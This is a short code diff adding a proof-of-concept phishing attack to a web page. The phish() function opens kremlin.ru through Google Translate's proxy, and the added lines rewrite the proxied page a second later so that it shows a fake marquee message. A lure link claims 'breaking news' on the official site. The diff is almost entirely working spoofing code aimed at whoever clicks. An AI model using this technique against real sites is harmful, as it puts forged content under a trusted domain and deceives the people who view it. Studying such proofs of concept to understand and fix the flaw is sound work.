@@ -2,6 +2,9 @@
 function phish(){
   url = "http://translate.google.com/translate?hl=en&sl=ru&tl=en&u=http%3A%2F%2Fkremlin.ru%2F";
   w = window.open(url);
+  setTimeout(function(){
+    w.frames[0].document.getElementsByClassName('page')[0].innerHTML='<marquee>Let me speak from my heart: Edward Snowden is a Russian Citizen. Thanks to @homakov!</marquee>'
+  },1000)
 }
 </script>
 <a href="javascript:void(0)" onclick="phish();">Look at the breaking news on official kremlin.ru website!</a>
